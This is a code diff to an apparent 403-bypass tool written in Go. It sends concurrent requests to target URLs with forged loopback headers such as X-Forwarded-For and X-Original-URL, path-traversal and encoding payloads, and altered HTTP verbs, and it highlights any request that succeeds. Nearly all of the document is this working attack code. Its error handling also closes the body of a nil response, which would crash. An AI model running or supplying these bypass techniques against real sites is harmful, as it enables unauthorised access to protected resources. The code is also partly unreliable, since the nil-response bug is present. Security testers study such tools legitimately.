@@ -34,111 +34,244 @@ import (
 	"net/url"
 	"os"
 	"strings"
+	"sync"
 )
 
+type Header struct {
+	Key   string
+	Value string
+}
+
+type Request struct {
+	Verb    string
+	Url     string
+	Headers []Header
+}
+
 func main() {
-	urlPtr, filePtr, silentPtr := parseCommandLineFlags()
+	urlPtr, filePtr, silentPtr, threadsPtr := parseCommandLineFlags()
 
 	if !*silentPtr {
 		showBanner()
 	}
 
-	headersList := []map[string]string{
-		{"X-Forwarded-For": "127.0.0.1:80"},
-		{"X-Forwarded-For": "127.0.0.1"},
-		{"X-Forwarded-Host": "127.0.0.1"},
-		{"X-Custom-IP-Authorization": "127.0.0.1"},
-		{"X-Host": "127.0.0.1"},
-		{"X-Remote-IP": "127.0.0.1"},
-		{"X-Originating-IP": "127.0.0.1"},
-		{"X-Original-URL": "%URL%"},
-		{"X-Original-URL": "%PATH%"},
-		{"X-rewrite-url": "%PATH%"},
-		{"Content-Length": "0", "HTTP": "GET"},
-		{"Content-Length": "0", "HTTP": "POST"},
-		{"HTTP": "POST"},
-		{"HTTP": "HEAD"},
-		{"HTTP": "PUT"},
-		{"HTTP": "DELETE"},
-		{"HTTP": "PATCH"},
-		{"HTTP": "OPTIONS"},
-		{"HTTP": "TRACE"},
+	headerKeysList := []string{
+		"Base-Url",
+		"CF-Conne",
+		"Client-IP",
+		"Content-Length",
+		"Destination",
+		"From",
+		"Http-Url",
+		"Profile",
+		"Proxy-Host",
+		"Proxy-Url",
+		"Proxy",
+		"Real-Ip",
+		"Redirect",
+		"Referer",
+		"Referrer",
+		"Request-Uri",
+		"True-Client-IP",
+		"Uri",
+		"Url",
+		"X-Arbitrary",
+		"X-Client-IP",
+		"X-Custom-IP-Authorization",
+		"X-Forward-For",
+		"X-Forwarded-By",
+		"X-Forwarded-For-Original",
+		"X-Forwarded-For",
+		"X-Forwarded-Host",
+		"X-Forwarded-Proto",
+		"X-Forwarded-Server",
+		"X-Forwarded",
+		"X-Forwarder-For",
+		"X-Hos",
+		"X-Host",
+		"X-Http-Destinationurl",
+		"X-HTTP-DestinationURL",
+		"X-Http-Host-Override",
+		"X-OReferrer",
+		"X-Original-Remote-Addr",
+		"X-Original-URL",
+		"X-Originally-Forwarded-For",
+		"X-Originating-IP",
+		"X-Proxy-Url",
+		"X-ProxyUser-Ip",
+		"X-Real-Ip",
+		"X-Remote-Addr",
+		"X-Remote-IP",
+		"X-Rewrite-URL",
+		"X-rewrite-url",
+		"X-WAP-Profile",
 	}
 
-	payloadsList := []string{
+	headerValuesList := []string{
+		"127.0.0.1",
+		"127.0.0.1:80",
+		"127.0.0.1:443",
+		"127.0.0.1:8080",
+		"localhost",
+		"localhost:80",
+		"localhost:443",
+		"localhost:8080",
+		"www.google.com",
+		"/",
+		"142.250.186.46",
+		"0",
+	}
+
+	var composedHeadersList []Header
+	for _, key := range headerKeysList {
+		for _, value := range headerValuesList {
+			header := Header{Key: key, Value: value}
+			composedHeadersList = append(composedHeadersList, header)
+		}
+	}
+
+	httpVerbsList := []string{"GET", "POST", "HEAD", "DELETE", "PUT", "PATCH", "OPTIONS", "TRACE"}
+
+	urlPayloadsList := []string{
 		"/", "/*", "/%2f/", "/./", "./.", "/*/", "?", "??", "&",
 		"#", "%", "%20", "%09", "/..;/", "../", "..%2f", "..;/",
 		".././", "..%00/", "..%0d", "..%5c", "..%ff/", "%2e%2e%2f",
 		".%2e/", "%3f", "%26", "%23", ".json",
 	}
 
+	// Let's Rock
 	urls := readUrlsFromInput(urlPtr, filePtr)
-	for i, pUrl := range urls {
+
+	for _, pUrl := range urls {
 		parsedURL, err := url.Parse(pUrl)
 		if err != nil {
 			panic(err)
 		}
 
+		// Try each header in composedHeadersList
+		var wg sync.WaitGroup
+		ch := make(chan Request, *threadsPtr)
+		for _, header := range composedHeadersList {
+			wg.Add(1)
+
+			var headerList []Header
+			headerList = append(headerList, header)
+
+			request := Request{Verb: "GET", Url: pUrl, Headers: headerList}
+
+			ch <- request
+
+			go talkHttpBaby(ch, &wg)
+		}
+
+		// Try each header with %URL% variable
+		for _, headerKey := range headerKeysList {
+			wg.Add(1)
+
+			var headerList []Header
+			header := Header{Key: headerKey, Value: pUrl}
+			headerList = append(headerList, header)
+
+			request := Request{Verb: "GET", Url: pUrl, Headers: headerList}
+
+			ch <- request
+
+			go talkHttpBaby(ch, &wg)
+		}
+
 		sUrl, sPath := getHostAndPath(parsedURL)
 
-		for _, headers := range headersList {
-			verb := getVerb(headers)
-			headers = replacePlaceholders(headers, sUrl, sPath)
-			req := createRequest(verb, pUrl)
+		// Try each header with %PATH% variable
+		for _, headerKey := range headerKeysList {
+			wg.Add(1)
 
-			if req == nil {
-				continue
-			}
+			var headerList []Header
+			header := Header{Key: headerKey, Value: sPath}
+			headerList = append(headerList, header)
 
-			for k, v := range headers {
-				req.Header.Add(k, v)
-			}
+			request := Request{Verb: "GET", Url: pUrl, Headers: headerList}
 
-			resp, err := http.DefaultClient.Do(req)
-			if err != nil {
-				fmt.Println(err, i)
-				continue
-			}
+			ch <- request
 
-			printOutputWithHeaders(resp.StatusCode, verb, sUrl, sPath, headers)
-
-			resp.Body.Close()
+			go talkHttpBaby(ch, &wg)
 		}
 
-		for i, payload := range payloadsList {
-			verb := "GET"
-			if sPath == "" {
-				sPath = "/"
-			}
+		// Try each URL payload in urlPayloadsList
+		var headerList []Header
+		for _, payload := range urlPayloadsList {
+			wg.Add(1)
+
 			loadedUrl := fmt.Sprintf("%s%s%s", sUrl, sPath, payload)
-			req := createRequest(verb, loadedUrl)
 
-			if req == nil {
-				continue
-			}
+			request := Request{Verb: "GET", Url: loadedUrl, Headers: headerList}
 
-			resp, err := http.DefaultClient.Do(req)
-			if err != nil {
-				fmt.Println(i, err)
-				continue
-			}
+			ch <- request
 
-			printOutput(resp.StatusCode, verb, loadedUrl)
-
-			resp.Body.Close()
+			go talkHttpBaby(ch, &wg)
 		}
+
+		// Try with different HTTP Verbs
+		for _, verb := range httpVerbsList {
+			wg.Add(1)
+
+			request := Request{Verb: verb, Url: pUrl, Headers: headerList}
+
+			ch <- request
+
+			go talkHttpBaby(ch, &wg)
+		}
+
+		close(ch)
+		wg.Wait()
 
 		fmt.Println("")
 	}
 }
 
-func parseCommandLineFlags() (*string, *string, *bool) {
+func talkHttpBaby(ch chan Request, wg *sync.WaitGroup) {
+	defer wg.Done() // Schedule the wg.Done() function call to be executed when the function returns
+
+	request := <-ch
+
+	statusCode := executeHttpRequest(request)
+
+	printOutput(statusCode, request.Verb, request.Url, request.Headers)
+}
+
+func executeHttpRequest(request Request) int {
+	verb := request.Verb
+	url := request.Url
+	headers := request.Headers
+
+	req := createRequest(verb, url)
+
+	if req == nil {
+		return -1
+	}
+
+	for _, header := range headers {
+		req.Header.Add(header.Key, header.Value)
+	}
+
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		fmt.Println(err)
+		resp.Body.Close()
+		return -1
+	}
+
+	resp.Body.Close()
+	return resp.StatusCode
+}
+
+func parseCommandLineFlags() (*string, *string, *bool, *int) {
 	urlPtr := flag.String("url", "", "URL to make requests to")
 	filePtr := flag.String("file", "", "Path to a file containing URLs")
 	silentPtr := flag.Bool("silent", false, "Don't print shizzle. Only what matters.")
+	threadsPtr := flag.Int("threads", 4, "The amount of threads to be used to execute the HTTP requests. Be gentle or get blocked.")
 	flag.Parse()
 
-	return urlPtr, filePtr, silentPtr
+	return urlPtr, filePtr, silentPtr, threadsPtr
 }
 
 func readUrlsFromInput(urlPtr, filePtr *string) []string {
@@ -202,28 +335,6 @@ func getHostAndPath(parsedURL *url.URL) (string, string) {
 	return sUrl, sPath
 }
 
-func getVerb(headers map[string]string) string {
-	verb := "GET"
-	for key, val := range headers {
-		if key == "HTTP" {
-			verb = val
-			break
-		}
-	}
-	return verb
-}
-
-func replacePlaceholders(headers map[string]string, sUrl, sPath string) map[string]string {
-	for key, val := range headers {
-		if key != "HTTP" {
-			val = strings.ReplaceAll(val, "%URL%", sUrl)
-			val = strings.ReplaceAll(val, "%PATH%", sPath)
-			headers[key] = val
-		}
-	}
-	return headers
-}
-
 func createRequest(verb string, pUrl string) *http.Request {
 	req, err := http.NewRequest(verb, pUrl, nil)
 
@@ -235,21 +346,12 @@ func createRequest(verb string, pUrl string) *http.Request {
 	return req
 }
 
-func printOutputWithHeaders(statusCode int, verb string, url string, path string, headers map[string]string) {
+func printOutput(statusCode int, verb string, url string, headers []Header) {
 	// Print in green if it's 200
 	if statusCode == 200 {
-		fmt.Printf("\033[32m%d => HTTP %s %s%s %v\033[0m\n", statusCode, verb, url, path, headers)
+		fmt.Printf("\033[32m%d => HTTP %s %s %v\033[0m\n", statusCode, verb, url, headers)
 	} else {
-		fmt.Printf("\033[31m%d => HTTP %s %s%s %v\033[0m\n", statusCode, verb, url, path, headers)
-	}
-}
-
-func printOutput(statusCode int, verb string, url string) {
-	// Print in green if it's 200
-	if statusCode == 200 {
-		fmt.Printf("\033[32m%d => HTTP %s %s\033[0m\n", statusCode, verb, url)
-	} else {
-		fmt.Printf("\033[31m%d => HTTP %s %s\033[0m\n", statusCode, verb, url)
+		fmt.Printf("\033[31m%d => HTTP %s %s %v\033[0m\n", statusCode, verb, url, headers)
 	}
 }
 
